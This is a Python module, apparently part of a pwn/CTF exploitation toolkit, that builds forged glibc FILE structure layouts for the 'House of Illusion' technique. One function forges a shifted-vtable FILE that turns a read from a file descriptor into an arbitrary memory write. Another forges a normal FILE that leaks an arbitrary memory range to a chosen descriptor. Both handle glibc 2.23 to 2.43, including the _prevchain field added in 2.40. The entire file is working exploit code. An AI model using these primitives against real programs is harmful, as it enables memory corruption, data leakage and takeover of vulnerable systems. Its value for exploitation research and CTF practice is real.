"""House of Illusion normal and shifted FILE sink layouts."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
UINT32_LIMIT = 1 << 32

FILE_FLAGS = 0x00
FILE_READ_END = 0x18
FILE_WRITE_BASE = 0x20
FILE_WRITE_PTR = 0x28
FILE_WRITE_END = 0x30
FILE_BUF_BASE = 0x38
FILE_BUF_END = 0x40
FILE_LOCK = 0x68
FILE_FILENO = 0x70
FILE_SAVED = 0x78
FILE_PREVCHAIN = 0xB8
FILE_VTABLE = 0xD8
FILE_IMAGE_SIZE = 0xE0

FLAG_IO_LINKED = 0x80
FLAG_IO_DELETE_DONT_CLOSE = 0x40
FLAG_IO_IS_APPENDING = 0x1000
FLAG_IO_CURRENTLY_PUTTING = 0x800

SHIFTED_FLAGS = FLAG_IO_LINKED | FLAG_IO_DELETE_DONT_CLOSE | FLAG_IO_IS_APPENDING
NORMAL_FLAGS = FLAG_IO_LINKED | FLAG_IO_CURRENTLY_PUTTING | FLAG_IO_IS_APPENDING


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def _build_base_image(
    file_jumps_addr: int,
    lock_addr: int,
    fd: int,
    target_addr: int,
    length: int,
    flags: int,
) -> bytearray:
    """Return a 0xe0-byte FILE image with common fields filled in."""

    if fd < 0 or fd >= UINT32_LIMIT:
        raise ValueError("fd must fit uint32")
    if length <= 0:
        raise ValueError("length must be positive")

    end = target_addr + length
    _check_uint64("target_addr", target_addr)
    if end >= UINT64_LIMIT:
        raise ValueError("target range overflows uint64")
    _check_uint64("lock_addr", lock_addr)

    image = bytearray(FILE_IMAGE_SIZE)
    image[FILE_FLAGS:FILE_FLAGS + 8] = flags.to_bytes(8, "little")
    image[FILE_LOCK:FILE_LOCK + 8] = _pack64(lock_addr)
    image[FILE_FILENO:FILE_FILENO + 4] = fd.to_bytes(4, "little")
    image[FILE_SAVED:FILE_SAVED + 8] = _pack64(0)
    image[FILE_WRITE_BASE:FILE_WRITE_BASE + 8] = _pack64(target_addr)
    image[FILE_WRITE_PTR:FILE_WRITE_PTR + 8] = _pack64(end)
    image[FILE_WRITE_END:FILE_WRITE_END + 8] = _pack64(end)
    image[FILE_BUF_BASE:FILE_BUF_BASE + 8] = _pack64(target_addr)
    image[FILE_BUF_END:FILE_BUF_END + 8] = _pack64(end)
    image[FILE_VTABLE:FILE_VTABLE + 8] = _pack64(file_jumps_addr)
    return image


def build_illusion_shifted_write(
    version: str,
    *,
    file_addr: int,
    file_jumps_addr: int,
    lock_addr: int,
    fd: int,
    target_addr: int,
    length: int,
    io_list_all_addr: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """生成 shifted vtable 的 fd -> target 任意写布局。

    version: 2.23～2.39 不需要 `_prevchain`，2.40～2.43 必须提供链表头槽地址。
    file_addr/lock_addr/fd/target_addr/length: fake FILE、锁、输入 fd 和 read 区间。
    file_jumps_addr: `_IO_file_jumps`，函数写入 `file_jumps - 8`。
    io_list_all_addr: 2.40+ fake 头节点的 `_prevchain`，通常是 `_IO_list_all` 地址。
    """

    _check_version(version)
    _check_uint64("file_addr", file_addr)
    _check_uint64("file_jumps_addr", file_jumps_addr)

    image = _build_base_image(
        file_jumps_addr=file_jumps_addr - 8,
        lock_addr=lock_addr,
        fd=fd,
        target_addr=target_addr,
        length=length,
        flags=SHIFTED_FLAGS,
    )

    if version >= "2.40":
        if io_list_all_addr is None:
            raise ValueError("2.40+ requires io_list_all_addr")
        _check_uint64("io_list_all_addr", io_list_all_addr)
        image[FILE_PREVCHAIN:FILE_PREVCHAIN + 8] = _pack64(io_list_all_addr)

    return (
        MemoryWrite(file_addr, bytes(image), f"shifted FILE ({version})"),
    )


def build_illusion_normal_read(
    version: str,
    *,
    file_addr: int,
    file_jumps_addr: int,
    lock_addr: int,
    output_fd: int,
    target_addr: int,
    length: int,
    io_list_all_addr: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """生成正常 `_IO_file_jumps` 的 target -> fd 任意读布局。

    version: 仅用于 2.40+ `_prevchain` 分支。
    output_fd: 目标泄露数据写入的 fd；target_addr/length 是输出区间。
    其余地址参数含义同 `build_illusion_shifted_write`。
    """

    _check_version(version)
    _check_uint64("file_addr", file_addr)
    _check_uint64("file_jumps_addr", file_jumps_addr)

    image = _build_base_image(
        file_jumps_addr=file_jumps_addr,
        lock_addr=lock_addr,
        fd=output_fd,
        target_addr=target_addr,
        length=length,
        flags=NORMAL_FLAGS,
    )

    # _IO_read_end 与 _IO_buf_end 的语义在正常读路径下不同。
    image[FILE_READ_END:FILE_READ_END + 8] = _pack64(target_addr)
    image[FILE_BUF_END:FILE_BUF_END + 8] = _pack64(target_addr + length)

    if version >= "2.40":
        if io_list_all_addr is None:
            raise ValueError("2.40+ requires io_list_all_addr")
        _check_uint64("io_list_all_addr", io_list_all_addr)
        image[FILE_PREVCHAIN:FILE_PREVCHAIN + 8] = _pack64(io_list_all_addr)

    return (
        MemoryWrite(file_addr, bytes(image), f"normal FILE ({version})"),
    )


def _check_version(version: str) -> None:
    if version not in {f"2.{minor}" for minor in range(23, 44)}:
        raise ValueError("House of Illusion supports glibc 2.23 through 2.43")
